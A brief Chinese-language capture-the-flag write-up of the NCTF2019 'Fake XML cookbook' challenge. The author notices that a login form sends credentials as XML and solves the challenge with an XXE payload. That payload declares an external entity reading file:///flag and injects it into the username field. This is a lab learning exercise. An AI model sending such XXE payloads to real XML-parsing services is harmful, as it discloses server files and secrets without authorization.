# [NCTF2019]Fake XML cookbook（学习）
![](<./img/Pasted image 20221126110208.png>)

---
首页长这样

![](<./img/Pasted image 20221126110251.png>)

有几行js，大意是将用户名和密码通过`xml`传输

![](<./img/Pasted image 20221126110150.png>)

瞎输一通出发了报错，好像可以对发送的`xml`进行注入

![](<./img/Pasted image 20221126110430.png>)

这玩意没咋了解过，就当是学习`XXE`了叭QAQ

https://xz.aliyun.com/t/6887

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY flag SYSTEM "file:///flag">
]>
<user>
	<username>&flag;</username>
	<password>123</password>
</user>
```

![](<./img/Pasted image 20221126115039.png>)
